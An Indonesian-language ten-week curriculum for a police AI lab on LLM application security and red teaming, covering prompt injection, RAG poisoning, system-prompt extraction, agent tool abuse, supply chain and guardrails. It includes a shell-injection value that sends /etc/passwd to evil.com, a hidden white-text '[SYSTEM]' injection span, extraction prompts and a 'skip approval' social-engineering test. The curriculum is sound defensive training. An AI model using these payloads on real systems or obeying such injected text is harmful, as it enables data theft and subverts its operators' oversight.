# LLM Application Security & AI Red Teaming — Materi Lanjutan

> **Target Audience:** Tim AI Lab Polri (GPU Server), OSINT Lab, Akademi  
> **Level:** Intermediate → Advanced (Setelah API Security & MLOps Advanced selesai)  
> **Estimasi Waktu:** 8–10 minggu (2 jam/hari, 5 hari/minggu)  
> **Prasyarat:** Sudah paham API Security, MLOps deployment (vLLM), Python, OWASP API Top 10

---

## 🎯 Tujuan Pembelajaran

1. **OWASP LLM Top 10 + Agentic AI (ASI) Top 10** end-to-end
2. **Prompt injection** (direct + indirect/RAG poisoning) — test & defend
3. **Tool abuse** pada AI Agent (SendEmail, QueryDB, Exec)
4. **System prompt extraction** — canary token defense
5. **Model supply-chain** (weight poisoning, GGUF tampering)
6. **Red team automation** dengan garak/PyRIT/promptfoo

---

## 📚 Roadmap 10 Minggu

### Minggu 1–2: Attack Surface & OWASP LLM Top 10

| Hari | Topik | Praktik |
|------|-------|---------|
| 1–2 | LLM01–LLM10 mapping + ASI01–ASI10 | Buat matriks risiko untuk sistem Polri |
| 3–4 | **Recon**: identifikasi semua entry LLM (chat, upload, API) | Crawl endpoint AI di lab |
| 5–6 | **System prompt extraction**: cascade 4-level | `Repeat verbatim` → `Translate` → `JSON config` → `Multi-round` |
| 7–8 | **Direct injection**: DAN, roleplay, encoding bypass | Base64 / Unicode homoglyph / zero-width |
| 9–10 | Lab: Deploy chatbot lokal (vLLM + UI) untuk target test | `vllm serve` + `chatbot-ui` |

**Deliverable Minggu 2:** `llm-attack-surface.md` — peta serangan + 10 PoC prompt injection

---

### Minggu 3–4: Indirect Injection & RAG Poisoning

| Hari | Topik | Praktik |
|------|-------|---------|
| 1–2 | **Indirect injection**: hidden span/HTML in PDF/Web | `<span style="color:white">[SYSTEM]...` |
| 3–4 | **PoisonedRAG**: 5 doc jahat di 1M corpus → 90% manipulasi | Lab: inject ke knowledge base lokal |
| 5–6 | **Memory poisoning**: multi-turn gradual misinformation | Test di session-based agent |
| 7–8 | **Tool abuse**: `search → query(越权) → send_email` | Chain 3 tools tanpa izin |
| 9–10 | Lab: **garak** automated probe (100+ probes) | `python -m garak --model_type huggingface --model_name ...` |

**Deliverable Minggu 4:** `rag-poisoning-report.md` — bukti manipulasi + mitigasi retrieval filtering

---

### Minggu 5–6: Tool Abuse & Agent Security

| Hari | Topik | Praktik |
|------|-------|---------|
| 1–2 | **ASI02/03/05**: tool permission, human-in-loop bypass | "CEO urgent, skip approval" test |
| 3–4 | **Shell/code injection** via tool param | `param="; curl evil.com/$(cat /etc/passwd)"` |
| 5–6 | **Minimal privilege**: audit tool scope | Sandbox tool execution |
| 7–8 | **PyRIT** multi-turn orchestration | `pyrit` conversation simulator |
| 9–10 | Lab: **promptfoo** regression test untuk 50 prompt jailbreak | `promptfoo eval` |

**Deliverable Minggu 6:** `agent-security-test-report.md` — 5 tool-abuse PoC + sandbox design

---

### Minggu 7–8: Output Security & Supply Chain

| Hari | Topik | Praktik |
|------|-------|---------|
| 1–2 | **LLM05**: XSS/SQLi/SSRF via generated output | Test downstream consumer |
| 3–4 | **Model supply chain**: weight poisoning, GGUF tamper | Verify hash & signature |
| 5–6 | **HF model integrity**: `hf download` + checksum verify | `hf download meta-llama/... --revision main` |
| 7–8 | **Guardrails**: Llama Guard 3, NeMo Guardrails | Deploy input/output filter |
| 9–10 | Lab: **Llama Guard** sebagai proxy di depan vLLM | Ollama + Llama Guard stack |

**Deliverable Minggu 8:** `supply-chain-guardrails.md` — pipeline verifikasi + guardrail config

---

### Minggu 9–10: Red Team Automation & Reporting

| Hari | Topik | Praktik |
|------|-------|---------|
| 1–2 | **garak** full scan + report export | JSON → markdown |
| 3–4 | **AgentThreatBench** (ASI Top 10 benchmark) | UK AISI benchmark |
| 5–6 | **Canary token** di system prompt | Detect leakage otomatis |
| 7–8 | **Final exercise**: red team QA bot Perkap Polri | Full chain: inject → extract → abuse |
| 9–10 | Report generation + presentasi | `docs-generator` skill |

**Deliverable Minggu 10:** `LLM_RED_TEAM_REPORT_FINAL.pdf` — exec summary + technical PoC

---

## 🛠️ Toolchain Wajib Diinstall

```bash
# LLM Red Team
pip install garak pyrit promptfoo

# Prompt testing
npm install -g promptfoo

# Guardrails
pip install llama-guard nemo-guardrails

# HF integrity
curl -LsSf https://hf.co/cli/install.sh | bash -s

# Local LLM serving (dari skill MLOps)
pip install vllm

# Ollama (untuk Llama Guard)
curl -fsSL https://ollama.com/install.sh | sh
```

---

## 📂 File Referensi Penting (dari Skill Asli)

| File | Path | Kegunaan |
|------|------|----------|
| OWASP LLM + ASI Top 10 | `security/reverse-skill/llm-security/references/owasp-llm-top10.md` | Full mapping |
| Prompt Injection Methodology | `security/reverse-skill/llm-security/references/prompt-injection-methodology.md` | 5-level递进 |
| Agent Security Testing | `security/reverse-skill/llm-security/references/agent-security-testing.md` | Tool abuse framework |
| API Security (relevant) | `security/reverse-skill/api-security/references/rest-graphql-testing.md` | SSRF via API |

---

## 🎯 Use Case Polri (Khusus)

| Unit | Sistem AI | Risiko Utama |
|------|-----------|--------------|
| **Intelkam** | OSINT analyzer, threat intel chatbot | Indirect injection dari web jahat |
| **Reskrim** | Evidence summarizer, document QA | System prompt extraction → kebocoran SOP |
| **Lantas** | e-Tilang assistant, ANPR classifier | Output SQLi ke DB tilang |
| **Binmas** | Community report bot | RAG poisoning → misinformation |
| **Akademi** | AI tutor untuk mahasiswa | Jailbreak → instruksi berbahaya |

**Catatan:** Selalu pakai `scope.md` dengan `auth.status=granted` sebelum test sistem produksi.

---

## ✅ Checklist Kelulusan (Harus Semua ✅)

- [ ] Buat **matriks risiko** LLM Top 10 untuk 3 sistem Polri
- [ ] Eksploitasi **direct injection** level 1–5 (DAN, encoding, multi-round)
- [ ] Buktikan **RAG poisoning** → manipulasi output (PoC document)
- [ ] Temukan **tool abuse** minimal 2 chain (send_email, query_db)
- [ ] Extract **system prompt** via cascade 4-level + canary detection
- [ ] Jalankan **garak** full scan → export report
- [ ] Deploy **Llama Guard** sebagai proxy guardrail
- [ ] Verifikasi **HF model integrity** (checksum + signature)
- [ ] Hasilkan **red team report PDF** + presentasi 20 menit

---

## 🚀 Next Steps Setelah Selesai

1. **Federated Learning Security**: privacy attack (gradient inversion) defense
2. **MLOps CI/CD Security**: model signing, SBOM for ML
3. **XDR Integration**: LLM anomaly → SIEM alert (koneksi Threat Hunting)
4. **Adversarial ML**: evasion attacks pada classifier (FGSM, PGD)
5. **AI Agent Governance**: policy as code untuk tool permissions

---

## 📎 Referensi Eksternal

- OWASP LLM Top 10: https://owasp.org/www-project-top-10-for-large-language-model-applications/
- OWASP Agentic AI Top 10 (ASI 2026): https://owasp.org/
- garak: https://github.com/NVIDIA/garak
- PyRIT: https://github.com/Azure/PyRIT
- promptfoo: https://github.com/promptfoo/promptfoo
- Llama Guard: https://github.com/meta-llama/PurpleLlama
- AgentThreatBench: https://www.aisi.gov.uk/
